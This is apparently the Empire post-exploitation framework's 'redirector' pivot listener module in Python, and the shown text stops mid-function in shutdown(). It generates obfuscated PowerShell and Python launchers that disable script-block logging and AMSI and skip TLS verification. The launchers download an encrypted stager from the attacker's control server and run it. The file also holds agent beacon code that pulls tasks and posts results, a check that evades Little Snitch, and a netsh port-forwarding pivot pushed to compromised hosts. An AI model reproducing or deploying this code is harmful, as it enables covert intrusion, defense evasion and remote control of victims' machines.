import base64
import random
import copy
import hashlib

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'redirector',

            'Author': ['@xorrior'],

            'Description': ("Internal redirector listener. Active agent required. Listener options will be copied from another existing agent."),

            # categories - client_server, peer_to_peer, broadcast, third_party
            'Category' : ('peer_to_peer'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Listener name. This needs to be the name of the agent that will serve as the internal pivot',
                'Required'      :   True,
                'Value'         :   ""
            },
            'internalIP' : {
                'Description'   :   'Internal IP address of the agent. Yes, this could be pulled from the db but it becomes tedious when there is multiple addresses.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ListenPort' : {
                'Description'   :   'Port for the agent to listen on.',
                'Required'      :   True,
                'Value'         :   80
            },
            'Listener' : {
                'Description'   :   'Name of the listener to clone',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {} # used to keep track of any threaded instances of this server

        # optional/specific for this module


        # set the default staging key to the controller db default
        #self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        print helpers.color("[!] default_response() not implemented for pivot listeners")
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/template generate_launcher(): no language specified!')
            return None

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]

            if language.startswith('po'):
                # PowerShell

                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                if safeChecks.lower() == 'true':
                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")

                    # ScriptBlock Logging bypass
                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPS")+"=[ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);If($"+helpers.generate_random_script_var_name("GPS")+"")
                    stager += "['ScriptB'+'lockLogging']"
                    stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPS")+"")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPS")+"")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
                    stager += "'signatures','N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(');$Ref.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true);")
                    stager += "};"
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$'+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            if len(username.split('\\')) > 1:
                                usr = username.split('\\')[1]
                                domain = username.split('\\')[0]
                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                            else:
                                usr = username.split('\\')[0]
                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")

                        #save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"

                # TODO: reimplement stager retries?
                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        else:
                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
                
                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #If host header defined, assume domain fronting is in use and add a call to the base URL first
                        #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                        if headerKey.lower() == "host":
                            stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")

                        stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)

                # add the RC4 packet to a cookie

                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)


                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python

                launcherBase = 'import sys;'
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                        launcherBase += "out, err = ps.communicate()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]

                launcherBase += "import urllib2;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                launcherBase += "req=urllib2.Request(server+t);\n"
                # add the RC4 packet to a cookie
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)


                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(':')[0]
                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                #install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"

                # download the stager and extract the IV

                launcherBase += "a=urllib2.urlopen(req).read();\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")

        else:
            print helpers.color("[!] listeners/template generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
            return None


        profile = listenerOptions['DefaultProfile']['Value']
        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
        launcher = listenerOptions['Launcher']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        killDate = listenerOptions['KillDate']['Value']
        host = listenerOptions['Host']['Value']
        customHeaders = profile.split('|')[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            #Patch in custom Headers
            if customHeaders != []:
                headers = ','.join(customHeaders)
                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            #Patch in the killdate, if any
            if killDate != "":
                stager = stager.replace('REPLACE_KILLDATE', killDate)

            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('index.jsp', stage1)
            stager = stager.replace('index.php', stage2)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            if obfuscate:
                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager

        elif language.lower() == 'python':
            # read in the stager base
            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            stager = helpers.strip_python_comments(stager)

            if host.endswith("/"):
                host = host[0:-1]

            if workingHours != "":
                stager = stager.replace('SET_WORKINGHOURS', workingHours)

            if killDate != "":
                stager = stager.replace('SET_KILLDATE', killDate)

            # # patch the server and key information
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("REPLACE_PROFILE", profile)
            stager = stager.replace("index.jsp", stage1)
            stager = stager.replace("index.php", stage2)

            # # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if obfuscate:
                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
            return code

        elif language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """

        if language:
            if language.lower() == 'powershell':

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                getTask = """
                    function script:Get-Task {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                }

                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                }

                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}

                                try {
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                        # restart key negotiation
                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
                                    }
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket)
        headers['Cookie'] = "session=%s" % (b64routingPacket)

    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        #if signaled for restaging, exit.
        if HTTPError.code == 401:
            sys.exit(0)

        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                return updateServers + sendMessage

            else:
                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
        else:
            print helpers.color('[!] listeners/http generate_comms(): no language specified!')


    def start(self, name=''):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """

        tempOptions = copy.deepcopy(self.options)
        listenerName = self.options['Listener']['Value']
        # validate that the Listener does exist
        if self.mainMenu.listeners.is_listener_valid(listenerName):
            # check if a listener for the agent already exists

            if self.mainMenu.listeners.is_listener_valid(tempOptions['Name']['Value']):
                print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Name']['Value']))
                return False

            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            sessionID = self.mainMenu.agents.get_agent_id_db(tempOptions['Name']['Value'])
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)

            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
                    #logic for powershell agents
                    script = """
        function Invoke-Redirector {
            param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)

            if($ShowAll){
                $out = netsh interface portproxy show all
                if($out){
                    $out
                }
                else{
                    "[*] no redirectors currently configured"
                }
            }
            elseif($Reset){
                $out = netsh interface portproxy reset
                if($out){
                    $out
                }
                else{
                    "[+] successfully removed all redirectors"
                }
            }
            else{
                if((-not $ListenPort)){
                    "[!] netsh error: required option not specified"
                }
                else{
                    $ConnectAddress = ""
                    $ConnectPort = ""

                    $parts = $ConnectHost -split(":")
                    if($parts.Length -eq 2){
                        # if the form is http[s]://HOST or HOST:PORT
                        if($parts[0].StartsWith("http")){
                            $ConnectAddress = $parts[1] -replace "//",""
                            if($parts[0] -eq "https"){
                                $ConnectPort = "443"
                            }
                            else{
                                $ConnectPort = "80"
                            }
                        }
                        else{
                            $ConnectAddress = $parts[0]
                            $ConnectPort = $parts[1]
                        }
                    }
                    elseif($parts.Length -eq 3){
                        # if the form is http[s]://HOST:PORT
                        $ConnectAddress = $parts[1] -replace "//",""
                        $ConnectPort = $parts[2]
                    }
                    if($ConnectPort -ne ""){

                        $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                        }
                    }
                    else{
                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                    }
                }
            }
        }
        Invoke-Redirector"""

                    script += " -ConnectHost %s" % (listenerOptions['Host']['Value'])
                    script += " -ListenPort %s" % (tempOptions['ListenPort']['Value'])

                    # clone the existing listener options
                    self.options = copy.deepcopy(listenerOptions)

                    for option, values in self.options.iteritems():

                        if option.lower() == 'name':
                            self.options[option]['Value'] = sessionID

                        elif option.lower() == 'host':
                            if self.options[option]['Value'].startswith('https://'):
                                host = "https://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['ListenPort']['Value'])
                                self.options[option]['Value'] = host
                            else:
                                host = "http://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['ListenPort']['Value'])
                                self.options[option]['Value'] = host


                    # check to see if there was a host value at all
                    if "Host" not in self.options.keys():
                        self.options['Host']['Value'] = host

                    self.mainMenu.agents.add_agent_task_db(tempOptions['Name']['Value'], "TASK_SHELL", script)
                    msg = "Tasked agent to install Pivot listener "
                    self.mainMenu.agents.save_agent_log(tempOptions['Name']['Value'], msg)


                    return True

                elif self.mainMenu.agents.get_language_db(self.options['Name']['Value']).startswith('py'):

                    # not implemented
                    script = """
                    """

                    print helpers.color("[!] Python pivot listener not implemented")
                    return False

                else:
                    print helpers.color("[!] Unable to determine the language for the agent")

            else:
                print helpers.color("[!] Agent is not present in the cache")
                return False


    def shutdown(self, name=''):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        if name and name != '':
            print helpers.color("[!] Killing listener '%s'" % (name))

            sessionID = self.mainMenu.agents.get_agent_id_db(name)
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
            if self.mainMenu.agents.is_agent_present(name) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):

                    script = """
                function Invoke-Redirector {
                    param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)

                    if($ShowAll){
                        $out = netsh interface portproxy show all
                        if($out){
                            $out
                        }
                        else{
                            "[*] no redirectors currently configured"
                        }
                    }
                    elseif($Reset){
                        $out = netsh interface portproxy reset
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully removed all redirectors"
                        }
                    }
                    else{
                        if((-not $ListenPort)){
                            "[!] netsh error: required option not specified"
                        }
                        else{
                            $ConnectAddress = ""
                            $ConnectPort = ""

                            $parts = $ConnectHost -split(":")
                            if($parts.Length -eq 2){
                                # if the form is http[s]://HOST or HOST:PORT
                                if($parts[0].StartsWith("http")){
                                    $ConnectAddress = $parts[1] -replace "//",""
                                    if($parts[0] -eq "https"){
                                        $ConnectPort = "443"
                                    }
                                    else{
                                        $ConnectPort = "80"
                                    }
                                }
                                else{
                                    $ConnectAddress = $parts[0]
                                    $ConnectPort = $parts[1]
                                }
                            }
                            elseif($parts.Length -eq 3){
                                # if the form is http[s]://HOST:PORT
                                $ConnectAddress = $parts[1] -replace "//",""
                                $ConnectPort = $parts[2]
                            }
                            if($ConnectPort -ne ""){

                                $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                if($out){
                                    $out
                                }
                                else{
